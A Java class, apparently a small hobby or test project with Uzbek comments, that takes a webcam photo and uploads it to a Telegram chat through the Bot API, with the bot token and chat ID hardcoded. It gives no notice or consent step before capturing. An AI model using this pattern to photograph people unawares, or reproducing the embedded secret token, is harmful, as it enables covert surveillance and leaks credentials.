package com.example.camera;

import java.awt.image.BufferedImage;
import java.io.File;
import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.core.io.FileSystemResource;
import org.springframework.web.client.RestTemplate;

public class UploadImage {

    public static void sendImage() {
        try {
            // 1️⃣ Kameradan rasm olish
            Webcam webcam = Webcam.getDefault();
            if (webcam == null) {
                System.out.println("Webcam topilmadi!");
                return;
            }
            webcam.open();
            BufferedImage image = webcam.getImage();
            File file = new File("new_image.jpg");
            ImageIO.write(image, "JPG", file);
            webcam.close();

            // 2️⃣ Telegramga yuborish
            String token = "8275555727:AAHcaJV4EULcJRy1QP5pHqzOvPa-LjTEkOM"; // Bot token
            String chatId = "-5220917100";  // Chat ID
            String url = "https://api.telegram.org/bot" + token + "/sendPhoto";

            RestTemplate restTemplate = new RestTemplate();
            MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
            body.add("chat_id", chatId);
            body.add("photo", new FileSystemResource(file));

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.MULTIPART_FORM_DATA);

            HttpEntity<MultiValueMap<String, Object>> requestEntity = new HttpEntity<>(body, headers);
            ResponseEntity<String> response = restTemplate.postForEntity(url, requestEntity, String.class);

            System.out.println("Telegram response: " + response.getBody());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
